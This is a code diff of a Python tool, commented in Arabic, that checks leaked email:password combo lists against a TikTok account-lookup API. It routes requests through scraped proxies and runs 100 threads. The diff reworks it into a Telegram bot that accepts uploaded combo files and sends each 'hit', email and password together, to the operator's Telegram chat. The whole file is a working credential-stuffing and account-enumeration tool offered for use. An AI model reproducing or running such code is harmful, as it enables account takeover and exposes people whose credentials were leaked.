@@ -6,120 +6,113 @@ import threading
 import telebot
 from concurrent.futures import ThreadPoolExecutor
 
-# --- الألوان ---
+# --- الألوان للكونسول ---
 class Colors:
-    G = '\033[92m' # أخضر
-    R = '\033[91m' # أحمر
-    C = '\033[96m' # سماوي
-    W = '\033[0m'  # أبيض
+    G = '\033[92m'
+    R = '\033[91m'
+    C = '\033[96m'
+    W = '\033[0m'
 
 class Stats:
     hits = 0
     bad = 0
-    errors = 0
     checked = 0
     proxies_list = []
+    is_running = False
+
+# --- إعدادات البوت ---
+TOKEN = input(f"{Colors.C}[?] Enter Bot Token: {Colors.W}").strip()
+CHAT_ID = input(f"{Colors.C}[?] Enter Your Telegram ID: {Colors.W}").strip()
+bot = telebot.TeleBot(TOKEN)
 
 # --- وظيفة سحب البروكسيات ---
 def scrape_proxies():
-    print(f"{Colors.C}[*] Scrapping proxies...{Colors.W}")
     urls = [
         "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all",
-        "https://www.proxy-list.download/api/v1/get?type=https",
         "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
     ]
+    Stats.proxies_list = []
     for url in urls:
         try:
             res = requests.get(url, timeout=10)
             Stats.proxies_list.extend(res.text.splitlines())
         except: continue
-    print(f"{Colors.G}[+] Total Proxies Loaded: {len(Stats.proxies_list)}{Colors.W}")
+    print(f"{Colors.G}[+] Proxies updated: {len(Stats.proxies_list)}{Colors.W}")
 
 # --- محرك الفحص ---
-def check_tiktok(email, password, bot, chat_id):
-    url = "https://api22-normal-c-alisg.tiktokv.com/passport/account_lookup/email/"
+def check_tiktok(line, bot_instance, chat_id):
+    if ":" not in line: return
+    email, password = line.split(":", 1)
     
-    # محاولة اختيار بروكسي
+    url = "https://api22-normal-c-alisg.tiktokv.com/passport/account_lookup/email/"
     proxy_addr = random.choice(Stats.proxies_list) if Stats.proxies_list else None
     proxy = {"http": f"http://{proxy_addr}", "https": f"http://{proxy_addr}"} if proxy_addr else None
 
-    params = {
-        "email": email,
-        "aid": "1233",
-        "device_platform": "android",
-        "version_code": "240504"
-    }
+    params = {"email": email, "aid": "1233", "device_platform": "android", "version_code": "240504"}
     
-    headers = {
-        "User-Agent": "com.zhiliaoapp.musically/2022405040 (Linux; U; Android 12)",
-        "Accept-Encoding": "gzip, deflate",
-        "Connection": "keep-alive"
-    }
-
     try:
-        response = requests.get(url, params=params, headers=headers, proxies=proxy, timeout=5)
+        response = requests.get(url, params=params, proxies=proxy, timeout=5)
         data = response.json()
 
         if data.get("message") == "success":
             Stats.hits += 1
             print(f"{Colors.G}[HIT] {email}{Colors.W}")
-            with open("data/hits.txt", "a") as f: f.write(f"{email}:{password}\n")
-            
-            if bot and chat_id:
-                bot.send_message(chat_id, f"✅ **New TikTok Hit!**\n\n📧 `{email}`\n🔑 `{password}`\n\n🚀 Cloud V7", parse_mode="Markdown")
+            bot_instance.send_message(chat_id, f"✅ **New Hit!**\n📧 `{email}`\n🔑 `{password}`", parse_mode="Markdown")
         else:
             Stats.bad += 1
-    except:
-        Stats.errors += 1
+    except: pass
     finally:
         Stats.checked += 1
 
-# --- الواجهة ---
-def ui():
-    while True:
-        os.system('clear')
-        print(f"""
-{Colors.C}      TIK TOK CLOUD CHECKER V7{Colors.W}
-        -----------------------
-        Hits: {Colors.G}{Stats.hits}{Colors.W}
-        Bad:  {Colors.R}{Stats.bad}{Colors.W}
-        Err:  {Stats.errors}
-        Done: {Stats.checked}
-        -----------------------
-        """)
-        time.sleep(2)
+# --- التعامل مع الرسائل والملفات ---
+@bot.message_handler(commands=['start'])
+def start(message):
+    bot.reply_to(message, "🚀 أهلاً بك! أرسل لي ملف `combo.txt` الآن وسأبدأ الفحص مباشرة على Google Cloud.")
 
-def main():
-    if not os.path.exists("data"): os.makedirs("data")
-    
-    token = input(f"{Colors.C}Bot Token (Enter to skip): {Colors.W}").strip()
-    chat_id = input(f"{Colors.C}Chat ID (Enter to skip): {Colors.W}").strip()
-    bot = telebot.TeleBot(token) if token else None
-
-    try:
-        combo = open("data/combo.txt", "r").read().splitlines()
-    except:
-        print(f"{Colors.R}[!] Add data/combo.txt first!{Colors.W}")
+@bot.message_handler(content_types=['document'])
+def handle_docs(message):
+    if Stats.is_running:
+        bot.reply_to(message, "⚠️ هناك عملية فحص جارية حالياً، يرجى الانتظار.")
         return
 
-    # خيار سحب البروكسيات
-    choice = input(f"{Colors.C}Use Auto-Proxy Scraper? (y/n): {Colors.W}")
-    if choice.lower() == 'y':
+    if message.document.file_name.endswith('.txt'):
+        bot.reply_to(message, "⏳ جاري تحميل الكومبو وتحديث البروكسيات...")
+        
+        # تحميل الملف
+        file_info = bot.get_file(message.document.file_id)
+        downloaded_file = bot.download_file(file_info.file_path)
+        
+        with open("data/combo.txt", "wb") as f:
+            f.write(downloaded_file)
+        
+        # تصفير الإحصائيات وبدء الفحص
         scrape_proxies()
+        combo = open("data/combo.txt", "r").read().splitlines()
+        
+        bot.send_message(message.chat.id, f"✅ تم استلام {len(combo)} حساب. بدأت العملية الآن... 🚀")
+        
+        threading.Thread(target=run_checker, args=(combo, message.chat.id)).start()
     else:
-        try:
-            Stats.proxies_list = open("data/proxy.txt", "r").read().splitlines()
-        except: pass
+        bot.reply_to(message, "❌ يرجى إرسال ملف نصي (.txt) فقط.")
 
-    threads = int(input(f"{Colors.C}Threads (Recommended 100+): {Colors.W}"))
-
-    threading.Thread(target=ui, daemon=True).start()
-
-    with ThreadPoolExecutor(max_workers=threads) as executor:
+def run_checker(combo, chat_id):
+    Stats.is_running = True
+    Stats.hits = 0
+    Stats.bad = 0
+    Stats.checked = 0
+    
+    with ThreadPoolExecutor(max_workers=100) as executor:
         for line in combo:
-            if ":" in line:
-                u, p = line.split(":", 1)
-                executor.submit(check_tiktok, u, p, bot, chat_id)
+            executor.submit(check_tiktok, line, bot, chat_id)
+    
+    Stats.is_running = False
+    bot.send_message(chat_id, f"🏁 **انتهى الفحص!**\n✅ Hits: {Stats.hits}\n❌ Bad: {Stats.bad}\nTotal: {Stats.checked}")
+
+# --- تشغيل البوت ---
+def main():
+    if not os.path.exists("data"): os.makedirs("data")
+    print(f"{Colors.G}[+] Bot is alive... Waiting for combo file via Telegram.{Colors.W}")
+    bot.infinity_polling()
 
 if __name__ == "__main__":
     main()
